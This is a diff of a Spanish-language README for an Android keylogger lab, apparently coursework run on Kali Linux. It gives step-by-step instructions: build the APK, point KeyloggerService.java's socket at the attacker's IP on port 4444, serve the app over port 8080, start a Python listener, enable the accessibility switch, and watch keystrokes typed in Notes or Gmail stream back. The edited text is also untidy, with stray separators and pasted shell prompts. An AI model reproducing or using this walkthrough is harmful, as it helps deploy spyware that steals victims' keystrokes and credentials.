@@ -22,7 +22,22 @@ Para evitar instalar Android Studio completo, usamos las herramientas oficiales 
 
 Ejecuta lo siguiente desde la raíz del proyecto (`~/proyecto_keylogger`):
 
+
 ```bash
+1. Dentro de la carpeta del repositorio clonado:
+# Asegúrate de estar dentro de la carpeta del repositorio clonado
+cd ~/{carpeta donde clonaste}/tb3-keylogger
+
+# Descargar e instalar Java 17 Portable
+wget https://github.com/adoptium/temurin17-binaries/releases/download/jdk-17.0.8.1%2B1/OpenJDK17U-jdk_x64_linux_hotspot_17.0.8.1_1.tar.gz
+tar -xzf OpenJDK17U-jdk_x64_linux_hotspot_17.0.8.1_1.tar.gz
+mv jdk-17.0.8.1+1 jdk-17
+
+# Descargar e instalar Gradle 7.5 Portable
+wget https://services.gradle.org/distributions/gradle-7.5-bin.zip
+unzip gradle-7.5-bin.zip
+
+=-=-==-=-=-=-=
 # 1. Descargar el paquete oficial de herramientas de línea de comandos de Google
 wget https://dl.google.com/android/repository/commandlinetools-linux-9477386_latest.zip
 
@@ -76,8 +91,21 @@ BUILD SUCCESSFUL
 Para evitar que el navegador interno de la Máquina Virtual Android utilice una versión vieja guardada en su memoria caché, nos movemos a la ruta de salida, duplicamos el archivo bajo un nombre nuevo (`keylogger_v2.apk`) y abrimos el puerto `8080`:
 
 ```bash
+
+
+=-=-=-= Antes de empezar, dirigete a open foder y en el buscador ingresas para dirigirte a la carpeta kali/{carpeta donde clonaste}/tb3-keylogger/app/src/main/java/com/mimalware/keylogger/KeyloggerService.java
+=-=-=-
+#Eso abrira un archivo vim donde debemos buscar esta linea
+- Socket socket = new Socket("TU_IP_AQUI", 4444);
+- Escribes la ip de tu maquina Kali
+
+
+Cambias
+
 # 1. Navegar hasta la carpeta profunda de compilación generada por Gradle
 cd app/build/outputs/apk/debug/
+
+
 
 # 2. Duplicar el APK para romper la caché del navegador
 cp app-debug.apk keylogger_v2.apk
@@ -94,7 +122,11 @@ En una segunda terminal independiente de Kali Linux, regresa a la raíz del proy
 
 ```bash
 # Regresar a la raíz e iniciar el listener TCP
-cd ~/proyecto_keylogger
+┌──(kali㉿kali)-[~]
+└─$ cd prueba-tb3/tb3-keylogger
+
+cd {carpeta donde clonaste}/tb3-keylogger
+
 python3 server.py
 ```
 
@@ -135,4 +167,3 @@ Y activa el interruptor.
 Abre Notas o Gmail en el dispositivo simulado y observarás la transmisión de logs en tiempo real hacia la terminal de Kali.
 
 ---
-
